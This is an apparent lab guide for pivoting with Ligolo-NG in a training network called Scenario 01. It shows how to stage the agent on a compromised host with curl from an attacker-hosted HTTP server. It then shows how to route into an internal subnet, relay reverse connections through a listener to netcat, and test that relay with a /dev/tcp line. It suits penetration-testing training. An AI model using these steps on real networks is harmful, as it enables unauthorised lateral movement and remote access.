# Ligolo-NG Pivoting Guide

Ligolo-NG provides the tunneling and pivoting infrastructure for the
Enterprise Pivot Lab.

Rather than requiring individual tools to use a SOCKS proxy, Ligolo
creates a TUN interface on the attacker system. Routes added to that
interface allow tools such as Nmap, curl, and SSH to communicate with
internal systems using normal IP addresses.

This document records the known-good Ligolo configuration used by
Scenario 01.

## Scenario 01 Network

``` text
                    KALI
              10.10.10.10
                    |
                 LAB-EXT
              10.10.10.0/24
                    |
                  WEB01
              10.10.10.20
              172.16.10.10
                    |
                 CORP-LAN
              172.16.10.0/24
                    |
                TARGET01
              172.16.10.20
```

Kali can directly communicate with WEB01. WEB01 can directly communicate
with TARGET01. Kali is not directly attached to CORP-LAN.

The purpose of the Ligolo tunnel is to give Kali routed access to:

``` text
172.16.10.0/24
```

## Components

### Proxy

The Ligolo proxy runs on Kali at `10.10.10.10`. It manages agent
sessions, TUN interfaces, routes, tunnels, and listeners.

### Agent

The Ligolo agent runs on the compromised WEB01 host. In Scenario 01 the
session appears similar to:

``` text
opscheck@Web01
```

Because WEB01 has interfaces on both LAB-EXT and CORP-LAN, it can act as
the pivot into the otherwise unreachable internal network.

## Start the Proxy

On Kali:

``` bash
sudo ligolo-proxy -selfcert
```

The proxy accepts agent connections on TCP port `11601`.

The known-good lab configuration runs the proxy with `sudo` because it
needs permission to create a TUN interface. Without sufficient
privileges, Ligolo may fail with a `TUNSETIFF` or
`operation not permitted` error.

## Stage the Agent

One simple transfer method is to temporarily host the agent from Kali:

``` bash
mkdir -p /tmp/ligolo-stage
cp /usr/bin/ligolo-agent /tmp/ligolo-stage/
cd /tmp/ligolo-stage
python3 -m http.server 8000 --bind 10.10.10.10
```

From WEB01:

``` bash
cd /tmp
curl http://10.10.10.10:8000/ligolo-agent -o ligolo-agent
chmod +x ligolo-agent
```

Stop the temporary HTTP server after the transfer completes.

## Connect the Agent

From WEB01:

``` bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

`-ignore-cert` is used because the lab proxy is running with a
self-signed certificate.

The Kali proxy should report a new WEB01 session.

## Select WEB01 and Inspect Its Networks

At the Ligolo console:

``` text
session
```

Select the WEB01 agent, then inspect the networks visible to it:

``` text
ifconfig
```

WEB01 should expose addresses corresponding to:

``` text
10.10.10.20/24
172.16.10.10/24
```

The new network of interest is `172.16.10.0/24`.

## Create the Pivot

With the WEB01 session selected:

``` text
autoroute
```

Select the network associated with `172.16.10.10/24`, create the
Kali-side interface as `ligolo-web01`, and start the tunnel when
prompted.

## Verify the Pivot

On Kali:

``` bash
ip link show ligolo-web01
ip route | grep 172.16.10
```

The expected route is:

``` text
172.16.10.0/24 dev ligolo-web01
```

Check the route Linux will use for TARGET01:

``` bash
ip route get 172.16.10.20
```

The important part of the output is:

``` text
dev ligolo-web01
```

A source address from another Kali interface may appear in the output.
That does not by itself mean the pivot is broken; the important point is
that the destination is routed through `ligolo-web01`.

## Test the Pivot

``` bash
ping -c 2 172.16.10.20
nmap -Pn -sV -p 22,80 172.16.10.20
curl http://172.16.10.20/
```

If these work, Kali has routed access to CORP-LAN.

## Why Normal Tools Work

Because Ligolo creates a TUN interface and Linux route, applications do
not need explicit SOCKS or proxy support.

For example:

``` bash
curl http://172.16.10.20/
ssh user@172.16.10.20
nmap -Pn 172.16.10.20
```

No `proxychains` configuration is required for this scenario.

## Routed Access Does Not Automatically Provide a Reverse Route

After the pivot, this path works:

``` text
Kali -> Ligolo -> TARGET01
```

That does not automatically mean this path works:

``` text
TARGET01 -> Kali
```

TARGET01 does not have a normal route to Kali's LAB-EXT address,
`10.10.10.10`.

Therefore, a reverse connection from TARGET01 directly to `10.10.10.10`
may fail even though Kali can successfully initiate connections to
TARGET01.

## Ligolo Listeners

A Ligolo listener can expose a port on WEB01 and relay incoming traffic
through the existing agent connection to Kali.

TARGET01 can directly reach WEB01 at `172.16.10.10`.

With the WEB01 session selected:

``` text
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
```

Immediately verify it:

``` text
listener_list
```

Do not assume a listener exists merely because `listener_add` was
entered. During Scenario 01 development, an empty listener table was the
reason a reverse connection failed.

## Reverse Connection Path

The working reverse path is:

``` text
TARGET01
172.16.10.20
     |
     | TCP/4445
     v
WEB01
172.16.10.10:4445
     |
     | Ligolo listener
     v
Ligolo tunnel
     |
     v
Kali
127.0.0.1:4445
     |
     v
Netcat
```

Listen on Kali:

``` bash
rlwrap nc -lvnp 4445
```

The internal callback destination is:

``` text
172.16.10.10:4445
```

## Test the Listener Independently

Before debugging an interactive payload, test the relay itself.

Start the listener on Kali:

``` bash
rlwrap nc -lvnp 4445
```

From a CORP-LAN system:

``` bash
timeout 3 bash -c \
  'echo TEST_FROM_INTERNAL > /dev/tcp/172.16.10.10/4445'
```

Kali should receive:

``` text
TEST_FROM_INTERNAL
```

This proves the network relay independently of the application payload.

## Troubleshooting Order

When TARGET01 is unreachable:

1.  Confirm the WEB01 agent is connected with `session`.
2.  Confirm WEB01 has `172.16.10.10/24`.
3.  Confirm `ligolo-web01` exists on Kali.
4.  Confirm `172.16.10.0/24` routes through `ligolo-web01`.
5.  Confirm WEB01 can directly reach TARGET01.
6.  Confirm Kali can reach TARGET01 through the tunnel.

Useful Kali checks:

``` bash
ip link show ligolo-web01
ip route | grep 172.16.10
ip route get 172.16.10.20
ping -c 2 172.16.10.20
nmap -Pn -p 22,80 172.16.10.20
```

For reverse connections, also verify:

``` text
listener_list
```

An empty listener table means there is no active relay.

## Cleanup

Remove the temporary agent from WEB01 when appropriate:

``` bash
rm -f /tmp/ligolo-agent
```

Remove staging files from Kali:

``` bash
rm -rf /tmp/ligolo-stage
```

After Ligolo is shut down, verify that temporary interfaces and routes
are gone:

``` bash
ip link show
ip route
```

## Future Multi-Pivot Scenarios

The same architecture can be extended:

``` text
KALI
  |
WEB01
  |
CORP-LAN
  |
APP01
  |
MGMT-LAN
  |
DB01
```

Scenario 02 can use WEB01 as the first pivot and a compromised
dual-homed APP01 as the second pivot. That introduces multiple tunnel
dependencies and route management while retaining the same basic model
established in Scenario 01.

## Quick Reference

Start the proxy:

``` bash
sudo ligolo-proxy -selfcert
```

Connect WEB01:

``` bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

Select the agent:

``` text
session
```

Inspect networks:

``` text
ifconfig
```

Create the route:

``` text
autoroute
```

Verify on Kali:

``` bash
ip route
ip route get 172.16.10.20
```

Create the reverse listener:

``` text
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
```

Verify it:

``` text
listener_list
```

Listen on Kali:

``` bash
rlwrap nc -lvnp 4445
```

Internal callback destination:

``` text
172.16.10.10:4445
```
